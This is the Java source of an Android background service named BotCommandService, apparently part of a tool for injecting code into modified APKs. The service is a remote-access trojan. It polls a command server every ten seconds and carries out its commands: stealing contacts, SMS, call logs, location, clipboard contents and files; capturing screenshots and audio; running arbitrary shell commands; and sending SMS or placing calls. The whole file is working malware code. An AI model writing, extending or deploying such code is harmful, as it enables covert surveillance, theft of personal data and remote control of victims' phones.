package com.apkmodifier;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import org.json.JSONArray;
import java.io.OutputStreamWriter;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Bot Command Service for remote management
 * Polls server for commands and executes them
 */
public class BotCommandService extends Service {
    private static final String TAG = "BotCommand";
    private Handler handler;
    private static final long POLL_INTERVAL = 10000; // Poll every 10 seconds
    private String deviceId;
    private boolean isRunning = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        deviceId = android.os.Build.MODEL + "_" + android.os.Build.DEVICE + "_" + 
                   String.valueOf(System.currentTimeMillis()).substring(8);
        startCommandPolling();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        isRunning = true;
        return START_STICKY;
    }
    
    private void startCommandPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    pollForCommands();
                    handler.postDelayed(this, POLL_INTERVAL);
                }
            }
        }, 0);
    }
    
    private void pollForCommands() {
        new Thread(() -> {
            try {
                URL url = new URL("http://127.0.0.1:5000/api/bot/get_commands");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject request = new JSONObject();
                request.put("device_id", deviceId);
                
                OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                writer.write(request.toString());
                writer.flush();
                writer.close();
                
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                    
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    if (jsonResponse.has("commands")) {
                        JSONArray commands = jsonResponse.getJSONArray("commands");
                        processCommands(commands);
                    }
                }
                
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error polling for commands", e);
            }
        }).start();
    }
    
    private void processCommands(JSONArray commands) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                JSONObject command = commands.getJSONObject(i);
                String commandId = command.getString("command_id");
                String commandType = command.getString("type");
                JSONObject params = command.optJSONObject("params");
                
                Log.d(TAG, "Processing command: " + commandType);
                
                String result = executeCommand(commandType, params);
                sendCommandResult(commandId, result, "success");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing commands", e);
        }
    }
    
    private String executeCommand(String type, JSONObject params) {
        try {
            switch (type) {
                case "collect_data":
                    return handleCollectData();
                    
                case "capture_screenshot":
                    return handleCaptureScreenshot();
                    
                case "get_contacts":
                    return handleGetContacts();
                    
                case "get_sms":
                    return handleGetSMS();
                    
                case "get_call_logs":
                    return handleGetCallLogs();
                    
                case "get_location":
                    return handleGetLocation();
                    
                case "download_file":
                    return handleDownloadFile(params);
                    
                case "upload_file":
                    return handleUploadFile(params);
                    
                case "execute_shell":
                    return handleExecuteShell(params);
                    
                case "get_installed_apps":
                    return handleGetInstalledApps();
                    
                case "get_device_info":
                    return handleGetDeviceInfo();
                    
                case "capture_audio":
                    return handleCaptureAudio(params);
                    
                case "send_sms":
                    return handleSendSMS(params);
                    
                case "make_call":
                    return handleMakeCall(params);
                    
                case "get_wifi_networks":
                    return handleGetWifiNetworks();
                    
                case "get_clipboard":
                    return handleGetClipboard();
                    
                case "set_clipboard":
                    return handleSetClipboard(params);
                    
                default:
                    return "Unknown command type";
            }
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleCollectData() {
        // Trigger full data collection
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("COLLECT_ALL");
        startService(intent);
        return "Data collection started";
    }
    
    private String handleCaptureScreenshot() {
        Intent intent = new Intent("com.apkmodifier.CAPTURE_SCREENSHOT");
        sendBroadcast(intent);
        return "Screenshot capture requested";
    }
    
    private String handleGetContacts() {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("GET_CONTACTS");
        startService(intent);
        return "Contacts collection started";
    }
    
    private String handleGetSMS() {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("GET_SMS");
        startService(intent);
        return "SMS collection started";
    }
    
    private String handleGetCallLogs() {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("GET_CALL_LOGS");
        startService(intent);
        return "Call logs collection started";
    }
    
    private String handleGetLocation() {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("GET_LOCATION");
        startService(intent);
        return "Location collection started";
    }
    
    private String handleDownloadFile(JSONObject params) {
        try {
            String fileUrl = params.getString("url");
            String fileName = params.optString("filename", "downloaded_file");
            
            new Thread(() -> {
                try {
                    URL url = new URL(fileUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.connect();
                    
                    File downloadsDir = new File(getExternalFilesDir(null), "downloads");
                    downloadsDir.mkdirs();
                    File outputFile = new File(downloadsDir, fileName);
                    
                    FileOutputStream fos = new FileOutputStream(outputFile);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    java.io.InputStream is = conn.getInputStream();
                    
                    while ((bytesRead = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, bytesRead);
                    }
                    
                    fos.close();
                    is.close();
                    conn.disconnect();
                    
                    Log.d(TAG, "File downloaded: " + outputFile.getAbsolutePath());
                } catch (Exception e) {
                    Log.e(TAG, "Download error", e);
                }
            }).start();
            
            return "File download started: " + fileName;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleUploadFile(JSONObject params) {
        try {
            String filePath = params.getString("path");
            File file = new File(filePath);
            
            if (!file.exists()) {
                return "File not found: " + filePath;
            }
            
            new Thread(() -> {
                try {
                    String boundary = "----Boundary" + System.currentTimeMillis();
                    URL url = new URL("http://127.0.0.1:5000/api/bot/upload_file");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                    conn.setDoOutput(true);
                    
                    java.io.DataOutputStream out = new java.io.DataOutputStream(conn.getOutputStream());
                    
                    // Add device_id
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n");
                    out.writeBytes(deviceId + "\r\n");
                    
                    // Add file
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
                    out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                    
                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                    fis.close();
                    
                    out.writeBytes("\r\n--" + boundary + "--\r\n");
                    out.flush();
                    out.close();
                    
                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "File uploaded, response: " + responseCode);
                    
                    conn.disconnect();
                } catch (Exception e) {
                    Log.e(TAG, "Upload error", e);
                }
            }).start();
            
            return "File upload started: " + file.getName();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleExecuteShell(JSONObject params) {
        try {
            String command = params.getString("command");
            Process process = Runtime.getRuntime().exec(command);
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            process.waitFor();
            return output.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleGetInstalledApps() {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("GET_APPS");
        startService(intent);
        return "Installed apps collection started";
    }
    
    private String handleGetDeviceInfo() {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("GET_DEVICE_INFO");
        startService(intent);
        return "Device info collection started";
    }
    
    private String handleCaptureAudio(JSONObject params) {
        try {
            int duration = params.optInt("duration", 10);
            Intent intent = new Intent("com.apkmodifier.CAPTURE_AUDIO");
            intent.putExtra("duration", duration);
            sendBroadcast(intent);
            return "Audio capture started for " + duration + " seconds";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleSendSMS(JSONObject params) {
        try {
            String number = params.getString("number");
            String message = params.getString("message");
            
            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            
            return "SMS sent to " + number;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleMakeCall(JSONObject params) {
        try {
            String number = params.getString("number");
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(android.net.Uri.parse("tel:" + number));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return "Call initiated to " + number;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleGetWifiNetworks() {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("GET_WIFI");
        startService(intent);
        return "WiFi networks collection started";
    }
    
    private String handleGetClipboard() {
        try {
            android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
                getSystemService(android.content.Context.CLIPBOARD_SERVICE);
            
            if (clipboard != null && clipboard.hasPrimaryClip()) {
                android.content.ClipData clipData = clipboard.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    return clipData.getItemAt(0).getText().toString();
                }
            }
            return "Clipboard is empty";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String handleSetClipboard(JSONObject params) {
        try {
            String text = params.getString("text");
            android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
                getSystemService(android.content.Context.CLIPBOARD_SERVICE);
            
            if (clipboard != null) {
                android.content.ClipData clip = android.content.ClipData.newPlainText("text", text);
                clipboard.setPrimaryClip(clip);
                return "Clipboard updated";
            }
            return "Clipboard service not available";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private void sendCommandResult(String commandId, String result, String status) {
        new Thread(() -> {
            try {
                URL url = new URL("http://127.0.0.1:5000/api/bot/command_result");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject response = new JSONObject();
                response.put("device_id", deviceId);
                response.put("command_id", commandId);
                response.put("result", result);
                response.put("status", status);
                response.put("timestamp", System.currentTimeMillis());
                
                OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                writer.write(response.toString());
                writer.flush();
                writer.close();
                
                conn.getResponseCode();
                conn.disconnect();
                
                Log.d(TAG, "Command result sent: " + commandId);
            } catch (Exception e) {
                Log.e(TAG, "Error sending command result", e);
            }
        }).start();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
